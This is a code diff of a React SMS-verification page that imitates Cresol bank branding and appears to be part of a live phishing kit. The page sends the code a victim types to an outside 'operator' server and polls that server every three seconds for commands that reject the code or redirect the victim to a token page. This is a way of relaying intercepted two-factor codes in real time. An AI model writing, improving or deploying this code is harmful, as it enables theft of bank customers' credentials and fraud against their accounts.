@@ -1,76 +1,144 @@
-import React, { useState, useEffect } from "react";
+
+import React, { useState, useEffect, useRef } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
-import { useClientMonitoring } from "@/hooks/useClientMonitoring";
+import { useClientStatus } from "@/hooks/useClientStatus";
+
+// Função para monitorar cliente continuamente na página SMS
+const monitorClientSms = async (
+  clientId: string, 
+  navigate: (path: string) => void,
+  onInvalidCode: () => void,
+  isMonitoringRef: React.MutableRefObject<boolean>
+): Promise<void> => {
+  console.log(`Iniciando monitoramento SMS do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
+  
+  const monitor = async () => {
+    if (!isMonitoringRef.current) {
+      console.log('Monitoramento SMS parado por flag');
+      clearInterval(intervalId);
+      return;
+    }
+
+    try {
+      console.log(`Consultando dados do cliente ${clientId} na página SMS...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      console.log(`Status da consulta SMS: ${response.status}`);
+      
+      if (response.ok) {
+        const clientData = await response.json();
+        console.log('Dados do cliente SMS recebidos:', clientData);
+        console.log('Valor do response SMS:', clientData.data?.response);
+        console.log('Valor do command SMS:', clientData.data?.command);
+        
+        // Verificar se o código SMS é inválido - NÃO para o monitoramento
+        if (clientData.data?.response === "inv_sms" || clientData.data?.command === "inv_sms") {
+          console.log('Detectado inv_sms - Código SMS inválido, mas continuando monitoramento');
+          onInvalidCode();
+          return; // Continua monitoramento, não para
+        }
+        
+        // Na página SMS: se receber ir_2fa, redireciona para token e para monitoramento
+        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
+          console.log('Detectado ir_2fa na página SMS - Redirecionando para /token');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          console.log('Monitoramento SMS parado - redirecionando...');
+          navigate('/token');
+          return;
+        }
+        
+        // Se receber ir_sms, continua monitorando (não redireciona)
+        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
+          console.log('Detectado ir_sms na página SMS - Continuando monitoramento...');
+        }
+        
+        console.log('Continuando monitoramento SMS...');
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na consulta SMS do cliente:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante consulta SMS do cliente:', error);
+    }
+  };
+
+  // Executar primeira consulta imediatamente
+  await monitor();
+  
+  // Configurar monitoramento contínuo a cada 3 segundos
+  intervalId = setInterval(monitor, 3000);
+  console.log('Monitoramento SMS contínuo configurado (3 segundos)');
+};
 
 const SmsPage = () => {
   const navigate = useNavigate();
-  const clientMonitoring = useClientMonitoring();
+  const clientStatus = useClientStatus();
   const [smsCode, setSmsCode] = useState("");
   const [clientId, setClientId] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [isInvalid, setIsInvalid] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+  const isMonitoringRef = useRef(false);
 
   useEffect(() => {
+    // Recuperar clientId do localStorage
     const storedClientId = localStorage.getItem('clientId');
-    console.log(`[SMS] [${clientMonitoring.isProduction ? 'PROD' : 'DEV'}] Inicializando página SMS`);
-    
     if (storedClientId) {
       setClientId(storedClientId);
-      console.log('[SMS] ClientId recuperado:', storedClientId);
+      console.log('ClientId recuperado do localStorage:', storedClientId);
       
-      // Aguardar um momento antes de iniciar o monitoramento para garantir que a página esteja totalmente carregada
-      setTimeout(() => {
-        clientMonitoring.startMonitoring(storedClientId, 'sms');
-      }, 500);
+      // Iniciar monitoramento de status
+      clientStatus.startMonitoring();
     } else {
-      console.log('[SMS] ClientId não encontrado, redirecionando para home');
-      navigate('/home');
+      console.log('ClientId não encontrado no localStorage');
     }
 
+    // Cleanup quando sair da página
     return () => {
-      console.log('[SMS] Cleanup: parando monitoramento');
-      clientMonitoring.stopMonitoring();
+      isMonitoringRef.current = false;
+      clientStatus.stopMonitoring();
     };
-  }, [clientMonitoring, navigate]);
+  }, [clientStatus]);
 
   const handleSmsCodeChange = (value: string) => {
     setSmsCode(value.replace(/\D/g, '').slice(0, 6));
+    // Reset error state when user starts typing
     if (isInvalid) {
       setIsInvalid(false);
       setErrorMessage("");
     }
   };
 
-  const handleInvalidSms = () => {
-    console.log('[SMS] SMS inválido detectado');
-    setSmsCode("");
-    setIsLoading(false);
-    setIsInvalid(true);
-    setErrorMessage("Código SMS inválido. Tente novamente.");
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!clientId) {
-      console.log('[SMS] ClientId não disponível para envio do SMS');
+      console.log('ClientId não disponível para envio do SMS');
       return;
     }
 
     try {
-      console.log('[SMS] Enviando código SMS:', smsCode);
+      console.log('Enviando código SMS via external-response:', smsCode);
+      console.log('ClientId utilizado:', clientId);
       
       setIsLoading(true);
       setIsInvalid(false);
       setErrorMessage("");
       
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 15000);
-
+      // Enviar código SMS para a API usando external-response
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
         method: 'PATCH',
         headers: {
@@ -78,39 +146,43 @@ const SmsPage = () => {
         },
         body: JSON.stringify({
           response: smsCode
-        }),
-        signal: controller.signal
+        })
       });
 
-      clearTimeout(timeoutId);
-
       if (response.ok) {
-        console.log('[SMS] Código SMS enviado com sucesso - aguardando resposta do monitoramento');
-        // O monitoramento detectará ir_2fa ou inv_sms automaticamente
+        console.log('Código SMS enviado com sucesso via external-response');
+        
+        // Só iniciar monitoramento se não estiver já monitorando
+        if (!isMonitoringRef.current) {
+          isMonitoringRef.current = true;
+          // Iniciar monitoramento contínuo após envio bem-sucedido
+          await monitorClientSms(
+            clientId, 
+            navigate,
+            () => {
+              // Função onInvalidCode modificada: limpa campo, para loading, mantém monitoramento
+              console.log('Código SMS inválido detectado - limpando campo e parando loading');
+              setSmsCode(""); // Limpar o campo SMS
+              setIsLoading(false); // Parar o loading
+              setIsInvalid(true);
+              setErrorMessage("Código SMS inválido. Tente novamente.");
+              // NÃO para o monitoramento - isMonitoringRef.current continua true
+            },
+            isMonitoringRef
+          );
+        }
       } else {
-        console.log('[SMS] Erro ao enviar código SMS:', response.status);
+        console.log('Erro ao enviar código SMS via external-response');
         setIsLoading(false);
-        setErrorMessage("Erro ao enviar código. Tente novamente.");
       }
     } catch (error) {
-      console.log('[SMS] Erro durante envio do SMS:', error);
+      console.log('Erro durante envio do SMS:', error);
       setIsLoading(false);
-      setErrorMessage("Erro de conexão. Verifique sua internet.");
     }
   };
 
-  // Configurar callback para SMS inválido
-  useEffect(() => {
-    window.handleInvalidSms = handleInvalidSms;
-    
-    return () => {
-      delete window.handleInvalidSms;
-    };
-  }, []);
-
   const handleBack = () => {
-    console.log('[SMS] Voltando para home');
-    clientMonitoring.stopMonitoring();
+    isMonitoringRef.current = false;
     navigate("/home");
   };
 
@@ -119,15 +191,6 @@ const SmsPage = () => {
       {/* Main Content Container */}
       <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-36 pb-8 relative">
         <div className="max-w-md w-full mx-auto">
-          {/* Debug info em desenvolvimento */}
-          {!clientMonitoring.isProduction && (
-            <div className="mb-4 p-2 bg-gray-100 text-xs">
-              <div>Env: {clientMonitoring.isProduction ? 'PROD' : 'DEV'}</div>
-              <div>Monitoring: {clientMonitoring.isMonitoring ? 'ON' : 'OFF'}</div>
-              <div>ClientId: {clientId}</div>
-            </div>
-          )}
-
           {/* Botão Voltar */}
           <button
             onClick={handleBack}
